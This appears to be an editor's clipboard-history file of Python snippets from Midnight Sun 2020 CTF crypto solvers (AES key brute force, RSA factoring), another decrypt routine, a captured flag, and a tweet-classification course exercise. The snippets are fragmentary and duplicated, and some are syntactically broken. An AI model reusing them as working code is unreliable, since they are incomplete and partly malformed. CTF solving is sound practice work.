	, 37: '
1d82d1d8a3e85729cfddccf2fc6c6a01|untitled:1|1|43|v|
	, 40: '
4be132c788525255e96c019cc0e6ccf6|untitled:1|1|43|v|
	, 41: '
4d510c981b684d58312dd0e5157d3d79|untitled:1|1|43|v|
	, 34: '
384e43bca096d0d2db9ec88b5d81b025|untitled:1|1|1|V|
	midnight{xwJjPw4Vp0Zl19xIdaNuz6zTeMQ1wlNP}
a3c7aee3816e9f62c70fc2304f6d3725|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|59|13|V|python
	            print(str(dec))
8a7c15b838626e07545d7cc86d36505b|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|39|1|V|python
	keys_pairs = map(''.join, itproduct(string.printable, repeat=2))
98bddd71dbf7d5c300d2b81a75f2fbd2|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|39|1|V|python
	for key in keys_pairs:
7ade563437bab799391ed429503551af|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|39|5|V|python
	    keys.append(key * 16)
cfc533298a0848b22905ebd44839d66e|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|53|9|V|python
	        for byte, value in mappings.items():
54deb2268f98a8d62b61d64c5b0785fd|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|59|13|V|python
	            print(dec)
12842b724ecc5998307dd190fd372ce6|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|57|13|V|python
	            print(value)
7a558bdfbd2495cb844b79388f66fba5|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|58|9|V|python
	        print(dec)
15cbb7ed71e7a401acf7503bacd54616|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|60|13|V|python
	            print("ole")
17d53a83ce99fb5ea8e26b494853b915|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|60|1|V|python
	                secret[key_pos1] = pair[0]
d3c25c8216e670377a32cd04f30c368d|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|47|5|V|python
	    print("next")
85468c66c70d39506ed6920e72b2f12b|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|60|21|V|python
	                    print(dec)
a4c49b606ae34da351c177004ae9b87f|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|60|21|V|python
	                    print(value)
b4dcf976873650336b5ec287d377705c|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|63|21|V|python
	                    print(secret)
8a449ff16cdf109cc15cd6f7e8e046a4|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|60|21|V|python
	                    print(pair)
32a6003ea03f29f4c4722d54cbf030ee|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|23|1|V|python
	possible = string.printable
	possible = map(''.join, product(possible, repeat=2))
	pool = mp.Pool(32)
	i = 0
	for c in pool.imap_unordered(hashit, possible, chunksize=100000):
	    mappings[c[0]] = c[1]
	pool.close()
4e63fa9a032e381889cfb7c5e3f2a333|file:///home/neo/CTFs/midnightsun2020/pybonhash/sol.py|19|1|V|python
	for d in data:
	    dig=hashlib.md5(bytes(map(ord ,d))).hexdigest()
	    md5s[dig]=d
863503cafa3c5124e7f9c16549b06fb2|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|9|5|V|python
	    print(pt)
b137487fd3b232f0368923f6510a8faf|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|22|5|V|python
	# for d in data:
	#     dig=hashlib.md5(bytes(map(ord ,d))).hexdigest()
	#     mappings[dig]=d
e2487028d0c2415ee2ba342fe636c25f|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|63|30|V|python
	                    print(key)
	                    print(pair)
8087478745928f71229c9c87df97b548|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|69|1|V|python
	                    data_pos1]
e48ad737c43d74a39b16f81f3739496a|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|63|1|V|python
	                    data[data_pos1] = pair[0]
b700bf04460a8a2da34860f1afd15c03|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|68|12|V|python
	                        print(data)
e5f55f9c5b3bb0cc1adf8d138baa6373|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|28|5|V|python
	    print(c[0], " ", c[1])
c9c17b8a61e3bd05d0c0215a88fd3793|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|68|1|V|python
	print(''.join(c for c in secret))
936658647129fde2d8d8f9c384ca22fa|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|67|25|V|python
	                        print(''.join(c for c in secret))
e10cf85da076edbbed4ecef06281e858|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|46|1|V|python
	while i < 408:
e28d921074b6efd226352992564b94a8|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|47|14|v|python
	encrypted_blocks[int(i/2)]
88f9d40c60edfac40f3eb28aea900941|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|32|1|V|python
	encrypted_blocks[encrypted_data[i:i+64] for i in range(0, len(encrypted_data), 64)]
17e73731de293faeac7776bfa0a56bd3|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|34|5|V|python
	i = 0
	while i < 102:
	    encrypted_blocks.append(binascii.unhexlify(encrypted_file.read(64).strip()))
698b98756dca96f7f980807c5922b8ad|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|33|44|v|python
	[encrypted_data[i:i+64].strip() for i in range(0, len(encrypted_data), 64)]
08cbdb8e9590bbce8a8eb12511d80dcc|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|66|25|V|python
	                        # print(data)
5ebe2294ecd0e0f08eab7690d2a6ee69|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|67|26|v|python
	secret
3abf4782cac095bfd4e12af06989c4c4|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|47|5|V|python
	    data_pos1 = FIB[i] % len(data)
f44751a9b105cb66dd4dfb3631593b76|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|49|5|V|python
	    data_pos2 = FIB[i] % len(data)
32104bba81f0081c17766f5d4c6d85cd|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|62|5|V|python
	                        data[data_pos1] = pair[0]
	                        data[data_pos2] = pair[1]
78ba25e7dd8ca3c94a7930bb78c19c0e|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|63|1|V|python
	print(''.join(c for c in data))
28b1de973081b17cce9757dc14fcc44b|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|63|1|V|python
	
	
	    #     binascii.hexlify(enc).decode('ascii')
	
	# while i<204:
	#     i+=1
	#     block = encrypted_file.read(32)
	#     print(block)
	#     todecrypt=binascii.unhexlify(block)
	#     for k in keys:
	#         thiskey = bytes(map(ord,k)) * 16
	#         cipher = AES.new(thiskey, AES.MODE_ECB)
	#         dec = str(cipher.decrypt(todecrypt))
	#         dec=dec[2:-1]
	#         if(re.findall(r"([a-fA-F\d]{32})",str(dec))):
	#             print("ole")
334243a16283b488c1ac296093a08658|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|69|1|V|python
	
	    #     binascii.hexlify(enc).decode('ascii')
	
	# while i<204:
	#     i+=1
	#     block = encrypted_file.read(32)
	#     print(block)
	#     todecrypt=binascii.unhexlify(block)
	#     for k in keys:
	#         thiskey = bytes(map(ord,k)) * 16
	#         cipher = AES.new(thiskey, AES.MODE_ECB)
	#         dec = str(cipher.decrypt(todecrypt))
	#         dec=dec[2:-1]
	#         if(re.findall(r"([a-fA-F\d]{32})",str(dec))):
	#             print("ole")
9957b737475e70f2bd38684028f901af|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|18|1|V|python
	MAXFIBSIZE = 42 + 204 + FIBOFFSET
62dafca605885f7d47c599ab8c6b4324|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|36|1|V|python
	print(len(encrypted_blocks))
07d61b285f43bc10015c4d0b553b2755|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|19|1|V|python
	data = ['?'] * 204
4a7555b7d56a8c31ab9d3b5503350a19|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|46|4|V|python
	    target = block
da938ac9d85f459118e538dfd67163e2|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|54|1|V|python
	            cipher = AES.new(bytes(key,'utf-8'), AES.MODE_ECB)
	            dec = str(cipher.decrypt(target))[2:-1]
d44af980b93b5c5919c276ffa6a35adf|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|64|1|V|python
	        #             if dec == value:
	        #                 secret[key_pos1] = key[0]
	        #                 secret[key_pos2] = key[1]
8fcb65e9ed486875dd492b8bd57fbf4e|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|59|19|v|python
	 == value:
c67bd6433a1fd4d52979cf097e4eef2e|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|30|1|V|python
	pool = mp.Pool(32)
66e786892a7a0e213d13e78415ffd0a0|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|67|1|V|python
	        #     if(re.findall(r"([a-fA-F\d]{32})", dec)):
a63a74c3e14a189aa69aecc318e850f9|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|60|1|V|python
	            if(re.findall(r"([a-fA-F\d]{32})", dec)):
	                print(dec)
	                if dec in mappings.values():
	                    secret[key_pos1] = key[0]
	                    secret[key_pos2] = key[1]
393054d7977ecf49ce5b592195dbf454|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|14|13|V|python
	            secret[key_pos1] = key[0]
c3ff2124e28e00394abda236c515e034|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|14|13|V|python
	            secret[key_pos2] = key[1]
f9976197ca17e5eae6c7a8d046ee0b57|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|15|5|V|python
	    return dec
072d8ab33ee670ce8d1034d93e8fa9d8|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|63|13|V|python
	            if(re.findall(r"([a-fA-F\d]{32})", dec)):
7700003ac2233ffe64235fa4b70dd621|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|63|17|V|python
	                print(dec)
b61fb24c7627486e9e3922979f16c37f|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|63|17|V|python
	                if dec in mappings.values():
d674dd1abd771c62dc5201197dc962c9|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|61|1|V|python
	        pool = mp.Pool(32)
	        for pair in pool.imap_unordered(decrypt, keys, chunksize=100000):
	            if not (pair is None):
	                secret[key_pos1] = pair[0]
	                secret[key_pos2] = pair[1]
	        pool.close()
2fadabc294feb59207f1de76e4c3d1d0|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|53|1|V|python
	for target in encrypted_blocks:
	    key_pos1 = (i + FIB[(FIBOFFSET + i)]) % 42
	    i += 1
	    key_pos2 = (i + FIB[(FIBOFFSET + i)]) % 42
	    i += 1
	    if '?' not in secret:
	        break
	    if secret[key_pos1] == '?' or secret[key_pos2] == '?':
18b3518173dad8b7e695a02f2b7f17d2|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|81|1|V|python
	                secret[key_pos1] = pair[0]
	                secret[key_pos2] = pair[1]
9cc2c3f537bc209b220aed8b9003bcbe|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|14|13|V|python
	            secret[key_pos2] = pair[1]
4323e5d0eb1e5e914e1fee3527e385a7|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|15|13|V|python
	            return(key[:2])
33c9b363aa666f43190fa83fce543646|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|13|32|v|python
	pair
527b437cd59e20994c71897fe0b834a4|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|15|5|V|python
	    return None
9485f1e67082f942d4fcf9e4ed703413|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|80|1|V|python
	            if not (pair is None):
4d64134eceebab05c04675bd54542dab|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|80|17|V|python
	                secret[key_pos2] = pair[1]
7c2ca9935dcf91891fff8161352963fb|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|80|26|v|python
	imap_unordered
a0a2800cbe6c42cff24b186665cbc3ed|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|10|5|V|python
	    cipher = AES.new(bytes(key,'utf-8'), AES.MODE_ECB)
08406a6e18bdf83010ddd1187251454d|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|78|9|v|python
	cipher
30bc747f0991bb4db1e27ccd27500f4b|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|81|1|V|python
	            aes = AES.new(bytes(key,'utf-8'), AES.MODE_ECB)
e8836748e623d76602c48b0757b75516|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|9|27|v|python
	, cipher
5ce36de81c68562b9cd56b005d68ade0|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|80|8|V|python
	        for key in keys:
	            aes = AES.new(bytes(key,'utf-8'), AES.MODE_ECB)
ca48a181f2fb297eb056b9b8cd1cc3b1|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|81|59|v|python
	, cipher=aes
1900f1e3149d1200233cbcc20da5a904|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|73|1|V|python
	for block in encrypted_blocks:
	    key_pos1 = (i + FIB[(FIBOFFSET + i)]) % 42
	    i += 1
	    key_pos2 = (i + FIB[(FIBOFFSET + i)]) % 42
	    i += 1
	    if '?' not in secret:
	        break
	    if secret[key_pos1] == '?' or secret[key_pos2] == '?':
	        pool = mp.Pool(32)
	        for pair in pool.map(partial(decrypt, target=block), ciphers):
	            if not (pair is None):
	                secret[key_pos1] = pair[0]
	                secret[key_pos2] = pair[1]
	        pool.close()
	print(''.join(c for c in secret))
1d9865b5f408dd0ee65c63aa0f430e70|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|73|1|V|python
	for block in encrypted_blocks:
	    key_pos1 = (i + FIB[(FIBOFFSET + i)]) % 42
	    i += 1
	    key_pos2 = (i + FIB[(FIBOFFSET + i)]) % 42
	    i += 1
	    if '?' not in secret:
	        break
	    if secret[key_pos1] == '?' or secret[key_pos2] == '?':
	        pool = mp.Pool(32)
	        for pair in pool.map(partial(decrypt, target=block), ciphers):
	            if not (pair is None):
	                secret[key_pos1] = pair[0]
	                secret[key_pos2] = pair[1]
	        pool.close()
a4b78ea03c6262b992fc8bffe34e0a50|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|49|1|V|python
	hers = []
	for key in keys:
	    ciphers.append(AES.new(bytes(key,'utf-8'), AES.MODE_ECB))
52a67b5c71dd45a1746359bbb0ead664|file:///home/neo/CTFs/midnightsun2020/pybonhash/sol.py|52|1|V|python
	print(''.join(['{0}{1}'.format(k, v) for k,v in real_key.iteritems()]))
7c0416d03955fb88cc1705b5f66d9a3c|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|71|7|v|python
	''.join(c for c in secret)
8b7dc4fc3fdd295acf0862778b85b26e|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|72|1|V|python
	print(len(secret))
45d19e896043a6ad4c53c5d9612c6bd9|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|70|1|V|python
	secret = ''.join(c for c in secret)
80460d73d95c0afa020e349df3631048|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|57|5|V|python
	    corpus.append(cleared_tweet)
fd88a254b9421fa3afcca4c479ba6c50|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|49|1|V|python
	corpus  = []
40e7e6b3bd9bfae62e5c9cad7cd27c69|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|66|1|V|python
	print("Corpus created successfully")    
a3d1ae0d1043978a72f231553b666b6d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|67|1|V|python
	print(pd.DataFrame(corpus)[0].head(10))
ffe2de5869b9944fb56cf46f6069e73e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|67|1|V|python
	rawTexData = data_train["text"].head(10)
f4bc6f33a4246e61524215a95ceb742c|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|67|1|V|python
	cleanTexData = pd.DataFrame(corpus, columns=['text after cleaning']).head(10)
47c3c8c4f3ff07fc0a202c83fadb8639|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|67|1|V|python
	frames = [rawTexData, cleanTexData]
8b66339836e2b4488f9d5d51a0b7104e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|67|1|V|python
	result = pd.concat(frames, axis=1, sort=False)
dbdc3a0d6d3820355cedd0d76316641d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|67|1|V|python
	print(result)
aa5e2cc08d83bc50ba1c856a87a89a73|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|49|1|V|python
	train_cleared  = []
369d76166059b061aad2f655cc11f1b6|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|68|1|V|python
	print(pd.DataFrame(train_cleared)[0].head(10))
fb229f089204f97fb5e84073fcfdea1a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|68|1|V|python
	cleanTexData = pd.DataFrame(train_cleared, columns=['text after cleaning']).head(10)
1dba0c1075eb9818db35d549e1d4f8a6|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|78|1|V|python
	# print(uniqueWordFrequents.head(10))
b15cd011bdd91e60ae50b093635223cf|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|78|1|V|python
	# print(uniqueWordFrequents['Word Frequent'].unique())
b1dd31e62fe99da89808fbd1d150038d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|80|1|V|python
	# print(uniqueWordFrequents.shape)
a55165d945d824196c2b3af8a3301531|file:///home/neo/Documents/epl448/disaster-tweets/clear-data/tweets.py|39|1|V|python
	
	# for i in range(5):
	#     print(train_df["text"].values[i])
	
	# print(train_df[train_df["target"] == 0]["text"].values[1])
	# print(train_df[train_df["target"] == 1]["text"].values[1])
bc7fb90ba1c2179d28793537e5890bb2|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|85|3|V|python
	# print("X shape = ",X.shape)
	# print("y shape = ",y.shape)
c8e2aa8d45470b3a9c1c6d7c41bb2890|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|87|1|V|python
	# print('data splitting successfully')
c1d951e1a7a62c24af22717c3b43a858|file:///home/neo/Documents/epl448/disaster-tweets/clear-data/tweets.py|66|1|V|python
	prediction_results = pd.read_csv("datasets/sample_submission.csv")
	
	prediction_results["target"] = clf.predict(test_vectors)
	
	prediction_results.head()
	
	prediction_results.to_csv("submission.csv", index=False)
580132c208d7f09147fe6813f2a38806|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|102|1|V|python
	prediction_results["target"] = clf.predict(test_vectors)
cd7c99c13b862d3d4ee8c7ff960c4693|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|103|32|v|python
	clf.predict(test_vectors)
f703a5eb052dab41cf76565f0a900e0c|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|66|1|V|python
	#Create our dictionary 
92ce6fac4c1f43012eec030c18372758|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|79|37|v|python
	Word Frequent
81cb771a2865c662165f55e21b8dc725|file:///home/neo/Documents/epl448/disaster-tweets/clear-data/tweets.py|61|1|V|python
	scores = model_selection.cross_val_score(clf, train_vectors, train_df["target"], cv=3, scoring="f1")
	print(scores)
d6a9f01c9203e0ab47ecdb6a60b24684|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|91|17|v|python
	X_train,y_train
f640dbc2d9a08be75b055600ed31b801|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|81|1|V|python
	count_vectorizer = CountVectorizer(max_features = word_count.shape[0])
54bda8890ae2011ffd1cae9a0361bcd3|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|82|36|v|python
	max_features = word_count.shape[0]
d5c422177458292627c6e79e9caf80f4|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|82|1|V|python
	count_vectorizer = CountVectorizer()
1523992079b402ab32709b90edfa13ec|file:///home/neo/Documents/epl448/disaster-tweets/clear-data/tweets.py|54|1|V|python
	test_vectors = count_vectorizer.transform(test_df["text"])
f6f3a97b195410c235c2f6a584e7c07f|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|83|43|v|python
	test_df
62380cbc489b0b730b1a79f59d328d61|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|88|1|V|python
	k_neighbors = KNeighborsClassifier(n_neighbors = 5,
	                                       weights = 'distance',
	                                      algorithm = 'brute')
a74ec9c5b6882f79e32a8fbd8da90c1b|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|92|51|v|python
	distance
98bd98ba41e1216ad3617d890df31075|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|93|52|v|python
	brute
9df22f196a33acd0b372fe502de51211|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|93|52|v|python
	auto
085c0c226c0d7a0706331c59d54e4220|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|67|1|v|python
	word_count
44c936f13a7db908b39aa74c39273602|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|83|51|v|python
	bag_of_words
daec6119cf18019fa63c83f616b90a78|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|83|51|v|python
	shape[0]
c12a4208f5f0cdee72b5cd136427a774|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|76|1|V|python
	# Put the words in a dataframe and keep only the words with occurences > 20
96fdcaaed7f1794334f2dd775ee64211|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|85|1|V|python
	vectorizer = CountVectorizer(max_features = vectorizer_max_features)
959f6d87a02c06e21dc7cbbc80f19a50|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|86|14|v|python
	CountVectorizer
0e02528edf19bea03494639f2105b2f7|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|83|1|V|python
	feature_names = vectorizer.get
7a224c99874b06402a39d6018ba12ec9|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|91|1|V|python
	print(feature_names)
984f6b47266545b1858f77b57788d6f8|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|95|13|v|python
	vectors
cec7843c65f7681e2e22dd177a41d5a5|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|96|1|V|python
	    dense_train = train_vectors.todense()
	    denselist_train = dense_train.tolist()
	    train_vectors = pd.DataFrame(denselist_train, columns=feature_names)
10e2e61a3a171eb825e910f362da4490|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|94|5|V|python
	    print("Dense")
3166a4c894e039e3dacbdbfac3b55a0b|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|97|1|V|python
	    # dense_train = train_vectors.todense()
	    # denselist_train = dense_train.tolist()
	    # train_vectors = pd.DataFrame(denselist_train, columns=feature_names)
	    # dense_test = test_vectors.todense()
	    # denselist_test = dense_test.tolist()
	    # test_vectors = pd.DataFrame(denselist_test, columns=feature_names)
35c2e05d4990f162350ec04e8d456f95|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|94|1|V|python
	    feature_names = vectorizer.get_feature_names()
05335ff18b073b8ca91a166e52590be1|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|101|1|V|python
	# k_neighbors = KNeighborsClassifier(n_neighbors = 7,
	#                                        weights = 'distance',
	#                                       algorithm = 'brute')
61508db330d05db9bcaf065dad1fdc2d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|108|1|V|python
	k_neighbors.fit(train_vectors, data_train['target'])
faed34f785cc4add86a221084f8684ab|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|102|1|V|python
	
	### Options:
	### weights: {'uniform', 'distance'}
	### algorithm: {‚Äòauto‚Äô, ‚Äòball_tree‚Äô, ‚Äòkd_tree‚Äô, ‚Äòbrute‚Äô}
	k_neighbors = KNeighborsClassifier(n_neighbors = 7,
	                                       weights = 'uniform',
	                                      algorithm = 'brute')
0cb933c98c94b083c4ce272cf679d8b8|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|113|1|V|python
	print('KNeighbors Model')
684afd2da5acc7689d24097023aff7fc|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|121|1|V|python
	prediction_results.head()
6024380c4c843466ea0290c5288940e7|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|91|33|V|python
	### Choose if you want dense data
	dense = True
4ffbc3407e214cebed88dc855e52e0a9|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|91|1|V|python
	# vectorizer = TfidfVectorizer(max_features = vectorizer_max_features)
8c0d5b5d3ad7b5fa64df44a5bfafbaa6|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|4|1|V|python
	n=int(n)
	print(n)
cd3e510e992d46f57be08ce3c859a0b8|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|4|1|V|python
	# q=11730908254239608218772512711094465707109491173933520439602402423994666380110733146100821801373509616895684311009196051099103042619767811276540394165710171
17a1d1dcaaaf0627de82589750c9c052|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|4|1|V|python
	# p=n/q
1fe6706fc0a65c689cea0abc20f105c8|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|4|1|V|python
	# print(p)
9e4b64c654dc11b5dcc68e47e781e65e|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|8|1|V|python
	print(prod)
577ba25828e58ae9ebe9f557e75d1b2f|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|8|1|V|python
	p = 0x7ef80c5df74e6fecf7031e1f00fbbb74c16dfebe9f6ecd29091d51cac41e30465777f5e3f1f291ea82256a72276db682b539e463a6d9111cf6e2f61e50a9280ca506a0803d2a911914a385ac6079b7c6ec58d6c19248c894e67faddf96a8b88b365f16e7cc4bc6e2b4389fa7555706ab4119199ec20e9928f75393c5dc386c6 print(hex(p)[:-1]) q = hex(p)[:1:-1]
	print(hex(p), q)
	prod = hex(p * q)
df70a0ca2a4275a72a3452523f431e83|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|8|1|V|python
	# print(prod)
9da1173b39c2087a0d53043a3ef23f03|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|5|1|V|python
	print(n)
b78a738147fb91ccdfff664391b686c1|file:///home/neo/ccsc/jaskier/solve.py|74|1|V|python
	        # for n in range(TABLE_DIM):
21e4ae5e669551d70ea5de15c34d02e1|file:///home/neo/ccsc/jaskier/solve.py|71|9|V|python
	        # print("Block: ", blk)
03a034180f47e6525086e45f2b7e55a7|file:///home/neo/ccsc/jaskier/solve.py|62|9|V|python
	            # print("Blk int:", blk_int)
48a9336ac5bb6254b58eb171ee1566b3|file:///home/neo/ccsc/jaskier/solve.py|60|9|V|python
	            # print("a,b: ", a, b)
a809dbcc729e0dbd3ac33d4b9c8b36a0|file:///home/neo/ccsc/jaskier/solve.py|58|13|V|python
	            # print("N:", n)
1b6689e089e713fad698ee6bab24887d|file:///home/neo/ccsc/jaskier/solve.py|56|9|V|python
	        # print("Block int:", blk_int)
78272fa589f1849ca1d8191e9d75a8bb|file:///home/neo/ccsc/jaskier/solve.py|43|1|V|python
	def decrypt(ct):
	    """
	    Decrypt function
	    Global Vars:
	    ------------
	    BLOCK_SIZE = 2
	    TABLE_DIM = 4
	    """
	    dec = [] 
	    blocks = blockify(ct, BLOCK_SIZE, b'\x00') 
	    for blk in blocks:
	        print("Block:", blk)
	        blk_int = int.from_bytes(blk, byteorder='big')
	        for n in range(TABLE_DIM, -1, -1):
	            a,b = cnt(blk_int, TABLE_DIM, n)
	            blk_int = h_rotl(blk_int, a, TABLE_DIM, b)
	        dec.append(blk_int.to_bytes(BLOCK_SIZE, byteorder='big'))
	    return b''.join(dec).strip(b'\x00')
	
	
	def encrypt(ct):
	    enc = [] 
	    blocks = blockify(ct, BLOCK_SIZE, b'\x00') 
	    for blk in blocks:
	        blk_int = int.from_bytes(blk, byteorder='big')
	        for n in range(TABLE_DIM, -1, -1):
	            a,b = cnt(blk_int, TABLE_DIM, n)
	            blk_int = h_rotr(blk_int, a, TABLE_DIM, b)
	        enc.append(blk_int.to_bytes(BLOCK_SIZE, byteorder='big'))
	    return b''.join(enc).strip(b'\x00')
2ba77b7040f24af657aca812e856a65e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|84|1|V|python
	min_frequency_threshold = 0
7bc4301f96650f30211c16abf073695d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|83|1|V|python
	### Choose min threshold for words to keep
	min_frequency_threshold = 0
87000751897523e91a72b194fe5822b1|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|118|1|V|python
	cv_scores = model_selection.cross_val_score(k_neighbors, train_vectors, data_train["target"], cv=k-fold scoring="f1")
ca636fe0acaf0d250172d5c0d2af5434|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|119|58|v|python
	train_vectors
0d5b9155ddc8f737877a40a4780b2a60|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|118|1|V|python
	# cv_scores = model_selection.cross_val_score(k_neighbors, train_vectors, data_train["target"], cv=k-fold scoring="f1")
